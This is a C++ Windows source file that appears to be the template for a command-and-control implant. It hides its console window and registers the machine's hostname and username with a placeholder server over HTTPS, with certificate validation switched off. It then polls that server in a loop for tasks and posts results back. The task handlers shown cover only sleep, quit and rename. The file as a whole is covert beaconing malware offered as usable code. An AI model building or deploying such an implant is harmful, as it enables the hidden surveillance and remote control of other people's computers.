#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

std::wstring get_utf16(const std::string& str, int codepage)
{
    if (str.empty()) return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}

std::string Get(std::string ip, unsigned int port, std::string uri)
{
    std::wstring sip = get_utf16(ip, CP_UTF8);
    std::wstring suri = get_utf16(uri, CP_UTF8);

    std::string response;
    LPSTR pszOutBuffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"test",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, sip.c_str(), port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"GET", suri.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    }

    if (hRequest) {
        // Set SSL options to ignore certificate errors
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {
                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

std::string Post(std::string ip, unsigned int port, std::string uri, std::string dat)
{
    LPSTR data = const_cast<char*>(dat.c_str());
    DWORD data_len = strlen(data);
    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headersLength = -1;

    std::wstring sip = get_utf16(ip, CP_UTF8);
    std::wstring suri = get_utf16(uri, CP_UTF8);

    std::string response;
    LPSTR pszOutBuffer;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    BOOL  bResults = FALSE;

    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"test",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (hSession) {
        hConnect = WinHttpConnect(hSession, sip.c_str(), port, 0);
    }

    if (hConnect) {
        hRequest = WinHttpOpenRequest(hConnect, L"POST", suri.c_str(), NULL,
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    }

    if (hRequest) {
        // Set SSL options to ignore certificate errors
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        bResults = WinHttpSendRequest(hRequest, additionalHeaders, headersLength,
            (LPVOID)data, data_len, data_len, 0);
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    if (bResults)
    {
        do
        {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {}

            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                dwSize = 0;
            }
            else
            {
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {}
                else {
                    response = response + std::string(pszOutBuffer);
                    delete[] pszOutBuffer;
                }
            }
        } while (dwSize > 0);
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return response;
}

std::vector<std::string> splits(std::string cmd, char delim = ' ')
{
    std::vector<std::string> result;
    std::stringstream ss(cmd);
    std::string token;

    while (std::getline(ss, token, delim)) {
        result.push_back(token);
    }

    return result;
}

int main(int argc, char const* argv[])
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::string name;
    std::string type = "w";
    int n = 3000;

    std::string ip = "{{IP_PLACEHOLDER}}";
    unsigned int port = { {PORT_PLACEHOLDER} };

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = sizeof(hostname);
    GetComputerNameA(hostname, &computerNameSize);

    char username[30];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);

    name = Post(ip, port, "/reg", "hostname=" + std::string(hostname) + "&type=" + type + "&user=" + std::string(username));

    while (true) {
        std::string task = Get(ip, port, "/tasks/" + name);

        if (!task.empty()) {
            std::vector<std::string> Task = splits(task);
            std::string command = Task[0];
            std::string res = "";

            if (command == "sleep") {
                int time = std::stoi(Task[1]);
                n = time * 1000;
            }
            else if (command == "quit") {
                exit(0);
            }
            else if (command == "rename") {
                name = Task[1];
            }

            Post(ip, port, "/results/" + name, "result=" + res);
        }

        Sleep(n);
    }
}
